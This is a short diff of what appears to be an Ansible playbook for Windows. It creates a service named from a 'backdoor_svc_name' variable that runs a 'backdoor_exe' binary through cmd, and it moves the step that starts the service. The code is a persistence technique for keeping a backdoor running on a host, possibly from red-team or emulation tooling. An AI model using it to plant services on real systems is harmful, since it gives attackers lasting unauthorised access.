@@ -13,7 +13,6 @@
     tags: PSH
     win_shell: |
       New-Service -Name "{{ backdoor_svc_name }}" -BinaryPathName "cmd /c {{ backdoor_exe }}"  
-      Start-Service -Name "{{ backdoor_svc_name }}"
   - name: start the new service, even if successfull, start will through an error message
     tags: CMD
     win_command: |
